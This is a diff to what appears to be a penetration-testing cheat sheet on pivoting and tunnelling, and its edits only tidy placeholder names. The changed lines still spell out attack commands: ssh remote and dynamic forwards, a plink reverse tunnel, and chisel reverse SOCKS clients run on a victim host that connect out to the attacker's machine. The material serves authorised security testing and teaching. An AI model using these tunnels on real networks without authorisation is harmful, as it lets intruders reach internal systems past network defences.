@@ -60,7 +60,7 @@ After the above command is run, the remote `httpd` service can be accessed by yo
 Brings a port from a machine in the internal victim's network to your attacking machine:
 
 ```
-ssh -N -R [your_ssh_server_interface]:[your_port]:[victim_ip]:[victim_port_you_want_to_forward] [attackerusername]@[your_ssh_server_ip]
+ssh -N -R [your_ssh_server_interface]:[your_port]:[victim_ip]:[victim_port_you_want_to_forward] [attacker_username]@[your_ssh_server_ip]
 ```
 
 The `your_ssh_server_interface:` can be omitted. 
@@ -99,7 +99,7 @@ You can use `socks5`, `http` or `https` protocol. `ICMP` is not supported.
 We create a dynamic application-level port forwarding from the attacking machine to the victim machine, by running the following at the attacker's machine:
 
 ```bash
-ssh -fND [proxychains.conf_port] [victim_user]@[victim_host]
+ssh -fND [proxychains.conf_port] [victim_username]@[victim_host]
 ```
 
 The `-f` requests ssh to run in background just before command execution.
@@ -198,7 +198,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward && iptables -t nat -A OUTPUT -p tcp -d 17
 Set a Dynamic Ssh port on default port 1080 of redsocks:
 
 ```
-ssh -NfD 1080 [victim user]@[victim ip]
+ssh -NfD 1080 [victim_username]@[victim_ip]
 ```
 
 ### Execute redsocks
@@ -212,7 +212,7 @@ ssh -NfD 1080 [victim user]@[victim ip]
 ### Remote Tunnel
 
 ```
-cmd.exe /c echo y | plink.exe -ssh -l root -pw toor -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
+cmd.exe /c echo y | plink.exe -ssh -l [attacker_username] -pw [attacker_ssh_password] -R [attacker_ip]:[attacker_port]:[victim_ip]:[victim_port] [attacker_ip]
 ```
 
 for example, suppose you have gained access at a dual-homed host and using this access, you want to access a port at another host that is not connected to the internet (you can't directly talk to it) but is accessible from the host you have access to:
@@ -279,7 +279,7 @@ chisel server -p 8080 --reverse
 
 Client Side (Victim):
 ```
-chisel-x64.exe client [myip]:8080 R:socks 
+chisel-x64.exe client [my_ip]:8080 R:socks 
 ```
 
 After that use **proxychains** with port 1080 (default).
@@ -299,7 +299,7 @@ chisel server -p 12312 --reverse
 Client Side (Victim):
 
 ```
-chisel client [myip]:12312 R:[port]:127.0.0.1:[port]
+chisel client [my_ip]:12312 R:[port]:127.0.0.1:[port]
 ```
 
 ## Socat 
